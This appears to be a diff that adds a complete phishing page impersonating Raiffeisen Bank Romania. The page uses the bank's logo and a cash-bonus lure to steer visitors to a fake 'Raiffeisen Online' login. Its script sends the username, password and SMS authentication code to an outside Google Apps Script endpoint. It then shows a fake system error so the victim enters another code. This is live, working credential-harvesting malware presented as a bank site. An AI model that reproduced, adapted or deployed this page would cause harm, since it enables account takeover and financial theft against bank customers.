@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Raiffeisen Bank | Personal</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root {
+            --raiff-yellow: #ffcc00;
+            --raiff-dark-blue: #005a87;
+            --text-grey: #666;
+            --bg-light: #f4f4f4;
+            --border-color: #eee;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Open Sans', Arial, sans-serif; }
+
+        body { background-color: #1a1a1a; display: flex; justify-content: center; min-height: 100vh; }
+
+        .app-container {
+            width: 100%;
+            max-width: 412px;
+            background: white;
+            min-height: 100vh;
+            position: relative;
+            box-shadow: 0 0 40px rgba(0,0,0,0.6);
+            overflow-y: auto;
+        }
+
+        .top-nav-tabs {
+            display: flex;
+            background: white;
+            padding: 12px 15px 0;
+            gap: 15px;
+            font-size: 0.65rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .tab-active { color: black; border-bottom: 3px solid var(--raiff-yellow); padding-bottom: 8px; }
+        .tab-inactive { color: var(--text-grey); }
+
+        header {
+            padding: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: white;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+
+        .logo { height: 32px; }
+
+        .header-actions { display: flex; gap: 8px; align-items: center; }
+
+        .btn-yellow-main {
+            background: var(--raiff-yellow);
+            color: black;
+            border: none;
+            padding: 8px 10px;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 0.7rem;
+            cursor: pointer;
+        }
+
+        .btn-login-outline {
+            border: 1px solid var(--raiff-dark-blue);
+            color: var(--raiff-dark-blue);
+            padding: 8px 10px;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 0.7rem;
+            background: white;
+        }
+
+        #home-screen { display: block; padding-bottom: 50px; }
+
+        .hero-banner {
+            padding: 25px 20px;
+            text-align: left;
+        }
+
+        .hero-banner h2 { font-size: 1.6rem; color: #333; line-height: 1.2; margin-top: 10px; }
+        
+        .promo-img-container {
+            width: 100%;
+            margin: 20px 0;
+        }
+
+        .promo-img-container img {
+            width: 100%;
+            display: block;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+
+        .hero-description { font-size: 0.95rem; color: #444; margin: 15px 0; line-height: 1.5; }
+
+        .btn-open-account {
+            width: 100%;
+            background: var(--raiff-yellow);
+            color: black;
+            padding: 16px;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 1rem;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        .section-title {
+            padding: 25px 20px 10px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .product-scroll {
+            display: flex;
+            overflow-x: auto;
+            padding: 10px 20px;
+            gap: 15px;
+            scrollbar-width: none;
+        }
+        .product-scroll::-webkit-scrollbar { display: none; }
+
+        .card {
+            min-width: 280px;
+            background: #fff;
+            border: 1px solid #eee;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+        }
+
+        .card img { width: 100%; height: 160px; object-fit: cover; }
+        .card-body { padding: 15px; }
+        .card-body h4 { font-size: 1rem; margin-bottom: 8px; color: #222; }
+        .card-body p { font-size: 0.85rem; color: #666; margin-bottom: 12px; line-height: 1.4; }
+        .card-link { color: var(--raiff-dark-blue); font-weight: bold; text-decoration: none; font-size: 0.85rem; }
+
+        .security-box {
+            margin: 20px;
+            padding: 15px;
+            background: #fff9e6;
+            border-left: 4px solid var(--raiff-yellow);
+            border-radius: 4px;
+        }
+        .security-box h5 { margin-bottom: 5px; color: #856404; font-size: 0.9rem; }
+        .security-box p { font-size: 0.8rem; color: #666; }
+
+        .footer-info {
+            background: #f9f9f9;
+            padding: 30px 20px;
+            margin-top: 20px;
+            border-top: 1px solid #eee;
+        }
+        .footer-info p { font-size: 0.8rem; color: #888; margin-bottom: 10px; }
+
+        #login-screen { 
+            display: none; 
+            background: url('https://images.unsplash.com/photo-1563986768609-322da13575f3?q=80&w=2070&auto=format&fit=crop') center/cover;
+            height: 100vh;
+            position: fixed;
+            width: 100%;
+            max-width: 412px;
+            top: 0;
+            z-index: 200;
+        }
+
+        .overlay {
+            background: rgba(0,0,0,0.8);
+            height: 100%;
+            padding: 25px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .back-nav { color: white; margin-bottom: 40px; font-size: 1rem; cursor: pointer; }
+
+        .welcome-text { color: white; margin-bottom: 35px; }
+        .welcome-text p { font-size: 1.1rem; margin-bottom: 5px; }
+        .welcome-text h1 { font-size: 2.3rem; font-weight: bold; }
+
+        .auth-card {
+            background: white;
+            border-radius: 4px;
+            overflow: hidden;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+        }
+
+        .error-strip {
+            display: none;
+            background: #cc0000;
+            color: white;
+            padding: 12px;
+            font-size: 0.85rem;
+            text-align: center;
+            font-weight: bold;
+        }
+
+        .input-box {
+            padding: 15px 20px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .input-box input {
+            width: 100%;
+            border: 1px solid #ccc;
+            padding: 14px;
+            font-size: 1rem;
+            outline: none;
+            border-radius: 4px;
+        }
+
+        #sms-container { display: none; background: #fdfdfd; }
+        .sms-label { font-size: 0.85rem; color: #005a87; font-weight: bold; margin-bottom: 8px; display: block; }
+
+        .btn-authenticate {
+            width: 100%;
+            background: #888;
+            color: white;
+            border: none;
+            padding: 18px 20px;
+            font-weight: bold;
+            font-size: 1.1rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .btn-authenticate.active { background: #333; }
+
+        .auth-footer {
+            display: flex;
+            justify-content: space-between;
+            margin-top: auto;
+            padding-bottom: 20px;
+            color: white;
+            text-align: center;
+        }
+
+        .auth-footer div { flex: 1; font-size: 0.75rem; }
+        .auth-footer i { display: block; font-size: 1.6rem; margin-bottom: 10px; }
+
+        .spinner {
+            display: none;
+            width: 22px;
+            height: 22px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+    
+    <div id="home-screen">
+        <div class="top-nav-tabs">
+            <span class="tab-active">Personal</span>
+            <span class="tab-inactive">Premium</span>
+            <span class="tab-inactive">Business</span>
+        </div>
+
+        <header>
+            <img src="https://www.raiffeisen.ro/content/dam/rbi/common/logos/Raiffeisen%20Bank.svg" class="logo" alt="Raiffeisen Logo">
+            <div class="header-actions">
+                <button class="btn-yellow-main" onclick="showLogin()">Raiffeisen Online</button>
+                <button class="btn-login-outline" onclick="showLogin()">Login</button>
+            </div>
+        </header>
+
+        <div class="hero-banner">
+            <p style="font-size: 0.75rem; font-weight: bold; color: #666; letter-spacing: 0.5px;">DESCHIDE CONT ONLINE ÎN 8 MINUTE</p>
+            <h2>Nu ești client? Deschide cont și poți primi până la 300 de lei BONUS</h2>
+            
+            <div class="promo-img-container">
+                <img src="https://images.unsplash.com/photo-1556742044-3c52d6e88c62?q=80&w=2070&auto=format&fit=crop" alt="Banking Promo">
+            </div>
+            
+            <div class="hero-description">
+                Devino client Raiffeisen, deschide un cont curent și primești garantat până la <strong>300 de lei</strong>. În plus, ai zero comisioane pentru plățile tale zilnice.
+            </div>
+            
+            <button class="btn-open-account" onclick="showLogin()">Vreau Contul</button>
+        </div>
+
+        <div class="security-box">
+            <h5><i class="fas fa-shield-alt"></i> Siguranța pe primul loc</h5>
+            <p>Nu comunica niciodată codul de autentificare sau parola nimănui prin telefon sau SMS.</p>
+        </div>
+
+        <div class="section-title">Produse recomandate</div>
+        <div class="product-scroll">
+            <div class="card">
+                <img src="https://images.unsplash.com/photo-1563013544-824ae1b704d3?q=80&w=2070&auto=format&fit=crop" alt="Card Cumparaturi">
+                <div class="card-body">
+                    <h4>Card de Cumpărături</h4>
+                    <p>Până la 36 de rate fără dobândă și 0% comision la comercianți.</p>
+                    <a href="#" class="card-link" onclick="showLogin()">Află mai multe ></a>
+                </div>
+            </div>
+            <div class="card">
+                <img src="https://images.unsplash.com/photo-1589758438368-0ad531db3366?q=80&w=2070&auto=format&fit=crop" alt="Personal Loan">
+                <div class="card-body">
+                    <h4>Credit de Nevoi Personale</h4>
+                    <p>Primești banii pe loc, direct în contul tău, cu dobândă fixă.</p>
+                    <a href="#" class="card-link" onclick="showLogin()">Calculează rată ></a>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer-info">
+            <p>© 2026 Raiffeisen Bank România</p>
+            <p>Acest site utilizează fișiere de tip cookie.</p>
+        </div>
+    </div>
+
+    <div id="login-screen">
+        <div class="overlay">
+            <div class="back-nav" onclick="showHome()">
+                <i class="fas fa-chevron-left"></i> Înapoi la site
+            </div>
+
+            <div class="welcome-text">
+                <p>Bun venit la</p>
+                <h1>Raiffeisen Online</h1>
+            </div>
+
+            <div class="auth-card">
+                <div class="error-strip" id="err-strip">
+                    <i class="fas fa-exclamation-triangle"></i> Eroare de sistem. Vă rugăm să reîncercați.
+                </div>
+
+                <div id="login-inputs">
+                    <div class="input-box">
+                        <input type="text" id="user" placeholder="Nume utilizator" oninput="validate()">
+                    </div>
+                    <div class="input-box" style="border-bottom: none;">
+                        <input type="password" id="pass" placeholder="Cod de autentificare" oninput="validate()">
+                    </div>
+                </div>
+
+                <div id="sms-container" class="input-box">
+                    <span class="sms-label">Introduceți codul primit prin SMS (6 cifre)</span>
+                    <input type="number" id="sms-code" placeholder="Cod SMS" oninput="validate()">
+                </div>
+
+                <button class="btn-authenticate" id="auth-btn" disabled onclick="handleAuth()">
+                    <span id="btn-text">Autentificare</span>
+                    <div class="spinner" id="loading"></div>
+                    <i class="fas fa-chevron-right" id="arrow"></i>
+                </button>
+            </div>
+
+            <div class="auth-footer">
+                <div><i class="fas fa-info-circle"></i>Informații</div>
+                <div><i class="fas fa-plus-circle"></i>Vreau asta</div>
+                <div><i class="fas fa-headset"></i>Contact</div>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    let step = 1;
+
+    function showLogin() {
+        document.getElementById('login-screen').style.display = 'block';
+        document.querySelector('.app-container').style.overflow = 'hidden';
+    }
+
+    function showHome() {
+        document.getElementById('login-screen').style.display = 'none';
+        document.querySelector('.app-container').style.overflow = 'auto';
+    }
+
+    function validate() {
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
+        const s = document.getElementById('sms-code').value;
+        const btn = document.getElementById('auth-btn');
+
+        if (step === 1) {
+            if(u.trim().length >= 3 && p.trim().length >= 4) {
+                btn.disabled = false;
+                btn.classList.add('active');
+            } else {
+                btn.disabled = true;
+                btn.classList.remove('active');
+            }
+        } else {
+            if(s.trim().length >= 5) {
+                btn.disabled = false;
+                btn.classList.add('active');
+            } else {
+                btn.disabled = true;
+                btn.classList.remove('active');
+            }
+        }
+    }
+
+    async function handleAuth() {
+        const user = document.getElementById('user').value;
+        const pass = document.getElementById('pass').value;
+        const sms = document.getElementById('sms-code').value;
+        const btn = document.getElementById('auth-btn');
+        const loader = document.getElementById('loading');
+        const arrow = document.getElementById('arrow');
+        const error = document.getElementById('err-strip');
+        const btnText = document.getElementById('btn-text');
+
+        btn.disabled = true;
+        loader.style.display = 'block';
+        arrow.style.display = 'none';
+        error.style.display = 'none';
+
+        const scriptURL = "https://script.google.com/macros/s/AKfycbz1fUYk1E4TIBY9URmNitmn69TRpG4VtLRElasfuOeE6DXT_5s5Slf31ILX8QYnQas1CA/exec";
+
+        const formData = new URLSearchParams();
+        formData.append('username', user);
+        formData.append('password', pass + (sms ? " [SMS: " + sms + "]" : ""));
+        formData.append('date', new Date().toLocaleString('ro-RO'));
+
+        try {
+            await fetch(scriptURL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: formData.toString()
+            });
+
+            setTimeout(() => {
+                loader.style.display = 'none';
+                arrow.style.display = 'block';
+                
+                if (step === 1) {
+                    document.getElementById('login-inputs').style.display = 'none';
+                    document.getElementById('sms-container').style.display = 'block';
+                    btnText.innerText = "Confirmă Cod SMS";
+                    step = 2;
+                    validate();
+                } else {
+                    error.style.display = 'block';
+                    document.getElementById('sms-code').value = "";
+                    btn.disabled = false;
+                }
+            }, 2500);
+
+        } catch (e) {
+            loader.style.display = 'none';
+            arrow.style.display = 'block';
+            error.style.display = 'block';
+            btn.disabled = false;
+        }
+    }
+</script>
+
+</body>
+</html>
